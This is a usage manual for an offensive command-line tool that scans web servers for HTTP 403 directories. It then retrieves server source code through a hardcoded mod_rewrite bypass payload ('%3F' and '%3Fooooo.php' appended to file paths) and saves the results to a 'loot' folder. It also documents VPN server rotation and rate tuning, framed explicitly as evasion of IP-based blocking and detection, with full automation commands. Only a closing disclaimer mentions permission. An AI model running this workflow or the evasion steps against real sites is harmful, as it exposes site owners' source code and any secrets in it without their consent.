# myesve

This document covers all commands, options, configuration, and advanced usage. For a quick overview, see [README.md](README.md).

## Table of Contents

- [Subcommands](#subcommands)
  - [scan](#scan)
  - [exploit](#exploit)
  - [vpn](#vpn)
  - [full](#full)
- [Global Options](#global-options)
- [Wordlist Locations](#wordlist-locations)
- [Rate Limiting & Evasion](#rate-limiting--evasion)
- [VPN Rotation Details](#vpn-rotation-details)
- [Example Workflows](#example-workflows)
- [Troubleshooting](#troubleshooting)

## Subcommands

### scan

Scan a target for HTTP 403 directories.

```bash
myesve scan -t TARGET [options]
```

| Option | Description | Default |
|--------|-------------|---------|
| `-t, --target` | Target base URL (scheme optional, http:// assumed) | required |
| `--dir-wordlist` | Path to directory wordlist | bundled `raft-medium-directories.txt` |
| `--threads` | Number of concurrent threads | 10 |
| `--rate` | Requests per second (0 = unlimited) | 0 |
| `--timeout` | Request timeout in seconds | 5 |
| `-o, --output` | Save found directories to file (one per line) | (none, print to stdout) |

Notes:

- The scanner appends a trailing slash to each directory and checks for status 403.
- Redirects are not followed (allow_redirects=False).
- Only exact 403 responses are considered; 404, 200, 301 etc. are ignored.

### exploit

Attempt to retrieve source code of files inside known 403 directories.

```bash
myesve exploit -t TARGET --directories DIR1 DIR2 ... [options]
# or
myesve exploit -t TARGET --directories-file FILE [options]
```

| Option | Description | Default |
|--------|-------------|---------|
| `-t, --target` | Target base URL | required |
| `--directories` | Space‑separated list of 403 directories | (mutually exclusive with --directories-file) |
| `--directories-file` | File containing one directory per line | (mutually exclusive with --directories) |
| `--webroot` | Web root path on the server | `/var/www/html` |
| `--file-wordlist` | Wordlist of file names to test | bundled `raft-medium-files.txt` |
| `--threads` | Number of concurrent threads | 5 |
| `--rate` | Requests per second limit | 0 |
| `--timeout` | Request timeout | 5 |
| `--download` | Save successfully retrieved files locally | False |
| `--download-dir` | Directory to store downloaded files | `loot` |

How it works:

For each directory `D` and each file `F` from the wordlist, the tool generates a URL:

`http://target/D/webroot/D/F%3F` and `http://target/D/webroot/D/F%3Fooooo.php`

(The two payloads `%3F` and `%3Fooooo.php` are hardcoded; they trigger the mod_rewrite bypass.)

If the response status is 200, the file content is considered disclosed. With `--download`, the raw content is saved as `{directory}_{filename}` inside `--download-dir`.

### vpn

Control Mullvad VPN. Requires the `mullvad` CLI installed and authenticated.

```bash
myesve vpn --status
myesve vpn --rotate [--country CODE]
myesve vpn --info
myesve vpn --traceroute TARGET
```

| Option | Description |
|--------|-------------|
| `--status` | Show current Mullvad server and IP location. |
| `--rotate` | Connect to a random Mullvad server. Optional `--country` (two‑letter code, e.g., `se`, `nl`). |
| `--info` | Display detailed geolocation (city, region, ISP, coordinates) of current public IP. |
| `--traceroute` | Run system traceroute to the given target (uses `traceroute` on Linux/macOS, `tracert` on Windows). |

Notes:

- If Mullvad is not installed or not running, the vpn subcommand will warn but not fail.
- The tool does not automatically disconnect or reconnect; you can manually disconnect with `mullvad disconnect`.

### full

Run a complete workflow: scan for 403 directories (unless a pre‑scanned file is provided), optionally rotate VPN, then exploit.

```bash
myesve full -t TARGET [options]
```

Accepts most options from `scan` and `exploit`, plus a few extras:

| Option | Description |
|--------|-------------|
| `--vpn` | Enable VPN rotation (requires Mullvad). |
| `--vpn-rotate-before` | Rotate to a new server before the exploit phase. |
| `--vpn-country` | Country code for VPN rotation (e.g., `se`). |
| `--dirs-file` | Use a pre‑scanned directory file (skip scanning). |

All other `scan` and `exploit` options (threads, rate, timeout, wordlists, download, etc.) are also available.

Example:

```bash
myesve full -t http://target.com --vpn --vpn-rotate-before --download
```

## Global Options

All subcommands support these:

- `-h, --help` – Show help message and exit.

No global verbosity flag currently, but `cprint` from termcolor controls output colour; errors go to stderr.

## Wordlist Locations

If you supply a custom wordlist path that does not exist, the tool will print an error and exit.

The tool also searches for the default wordlists in the following order (when not overridden):

1. Inside the installed package (`importlib.resources`).
2. `./wordlists/` (relative to current working directory).
3. `~/.config/myesve/wordlists/`.
4. `/usr/share/wordlists/`.
5. `/usr/share/seclists/Discovery/Web-Content/`.
6. `~/SecLists/Discovery/Web-Content/`.

You can place your own `raft-medium-*.txt` files in any of those directories, or just use the `--dir-wordlist` and `--file-wordlist` options.

## Rate Limiting & Evasion

- Use `--rate N` to send at most N requests per second (smooth, not bursty). The tool uses a token‑bucket style limiter with `time.sleep()`.
- For scanning, lower thread counts (e.g., 5–10) combined with low rate (e.g., 5‑10) mimic human browsing.
- For exploitation, you may increase threads and rate if the target can handle it.
- VPN rotation (with Mullvad) changes your public IP. The `full` command with `--vpn-rotate-before` rotates once before exploit, which is enough to avoid IP‑based blocking during the active disclosure phase.

## VPN Rotation Details

The `MullvadController` class runs the official Mullvad CLI tool. It expects:

- `mullvad` in PATH.
- The user to be logged in (`mullvad account login`).
- The VPN to be disconnected or connected (the tool will connect automatically).

Rotation steps:

1. Fetch the relay list (`mullvad relay list`).
2. Parse hostnames (lines that do not start with space and are not "Relays:").
3. Filter by `--country` if provided (case‑insensitive substring match on hostname).
4. Pick a random candidate.
5. Run `mullvad relay set location <chosen>` and `mullvad connect`.
6. Wait 5 seconds for the tunnel to establish.
7. Show new public IP via `ip-api.com`.

If no candidate matches, the tool prints an error and does not rotate.

## Example Workflows

### Basic scan and manual exploit

```bash
myesve scan -t http://testphp.vulnweb.com -o found.txt
myesve exploit -t http://testphp.vulnweb.com --directories-file found.txt --download
ls loot/
```

### Full automation with VPN rotation

```bash
myesve full -t http://target.com --vpn --vpn-rotate-before --threads 15 --rate 10 --download
```

### Use custom wordlists

```bash
myesve scan -t http://target.com --dir-wordlist ~/my-dirs.txt --threads 20
myesve exploit -t http://target.com --directories-file dirs.txt --file-wordlist ~/my-files.txt
```

### Rotate to a Swedish VPN server and check location

```bash
myesve vpn --rotate --country se
myesve vpn --info
```

## Troubleshooting

**Q:** The scanner finds no 403 directories, but I know they exist.  
**A:** The target might respond with 404, 200, or a custom error page. Try increasing `--timeout` or lowering `--rate`. Also ensure the base URL is correct and the server does not require a trailing slash.

**Q:** Exploit returns 200 but the file content is empty or not source code.  
**A:** The payload might not work on that Apache version or configuration. Try different `--webroot` values (e.g., `/home/user/public_html`). Also note that some servers return 200 but with a default error page – check the saved file.

**Q:** VPN rotation fails with "Mullvad CLI not found".  
**A:** Install Mullvad from [mullvad.net](https://mullvad.net) and ensure `mullvad` is in your PATH. Run `mullvad version` to test.

**Q:** I get "Too many open files" on Linux.  
**A:** Reduce `--threads` or increase system limits (`ulimit -n 4096`).

**Q:** The tool is slow.  
**A:** Increase `--threads` and/or `--rate`. But be respectful to the target.

## Additional Notes

- The tool uses HTTP/1.1 without redirect following. It does not handle HTTPS certificate verification (it uses the default `requests` behaviour, which verifies certs). Disable verification by setting environment variable `CURL_CA_BUNDLE=""` or modify the code – not recommended for security reasons.
- All requests set a default `User-Agent: python-requests/...`. You can spoof it by subclassing the scanner or exploiter – not built‑in.
- For large wordlists, memory usage is minimal because directories and files are loaded into lists (Python strings). For millions of entries, consider a streaming generator (not implemented).

## License and Responsible Use

See the license in [LICENSE](LICENSE). Remember that unauthorised use of this tool may violate local laws and computer misuse acts. Use only with explicit permission.
